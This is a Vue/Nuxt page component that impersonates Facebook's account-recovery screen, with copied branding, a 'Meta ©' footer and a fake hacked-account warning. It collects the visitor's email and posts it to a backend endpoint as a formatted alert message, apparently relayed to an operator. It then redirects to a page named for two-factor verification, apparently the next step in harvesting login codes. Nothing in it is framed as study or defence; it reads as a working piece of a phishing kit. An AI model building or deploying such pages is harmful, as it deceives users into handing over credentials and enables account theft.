<script setup lang="ts">
const email = ref('')
const router = useRouter()
async function submitForm() {
  if (!email.value) return

  try {
    await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ message: `📭 Email: <code>${email.value}</code>` }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    router.push('/two_step_verification/two_factor')
  } catch (error) {
    console.error(error)
  }

  // Call your API here
}
</script>
<template>
  <div class="flex gap-5 flex-col bg-[#e9ebef] justify-center items-center h-lvh">
    <p class="max-md:hidden text-[28px] text-[#0064E0] cursor-pointer font-bold">facebook</p>
    <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[500px] shadow-md p-5">
      <p
        class="hidden max-md:block text-center mb-3 text-[28px] text-[#0064E0] cursor-pointer font-bold"
      >
        facebook
      </p>
      <p class="text-center">{{ $t('Enter email linked to facebook') }}</p>
      <div class="mt-2 border p-2 border-yellow-500 bg-yellow-100 text-sm">
        {{
          $t(
            "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
          )
        }}
        <a class="text-[#0064E0]" href="http://facebook.com/profile.php">
          {{ $t('cancel this process') }}
        </a>
      </div>
      <input
        v-model="email"
        type="email"
        class="border my-4 p-2 w-full border-gray-300 rounded-md"
        placeholder="Email"
      />
      <button
        class="w-full rounded border-0 bg-blue-500 p-2 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500"
        @click="submitForm"
      >
        {{ $t('Continue') }}
      </button>
      <div class="mt-5 flex flex-col items-center lg:hidden">
        <a href="#" class="text-blue-600">{{ $t('Forgotten password?') }}</a>
        <div class="flex w-full items-center my-4">
          <hr class="flex-grow border-black" />
          <span class="mx-4">or</span>
          <hr class="flex-grow border-black" />
        </div>
        <div class="grid grid-cols-2">
          <div class="m-5 mt-10 flex flex-col">
            <a href="#" class="self-center whitespace-nowrap text-blue-600">English (UK)</a>
            <a href="#" class="self-center whitespace-nowrap text-blue-600">Français (France)</a>
            <a href="#" class="self-center whitespace-nowrap text-blue-600">Español</a>
          </div>
          <div class="m-5 mt-10 flex flex-col">
            <a href="#" class="self-center whitespace-nowrap text-blue-600">Português (Brasil)</a>
            <a href="#" class="self-center whitespace-nowrap text-blue-600">Deutsch</a>
            <a href="#" class="self-center">+</a>
          </div>
        </div>
        <span class="mt-4"
          >Meta ©
          {{ new Date().getFullYear() }}
        </span>
      </div>
    </div>
  </div>
</template>
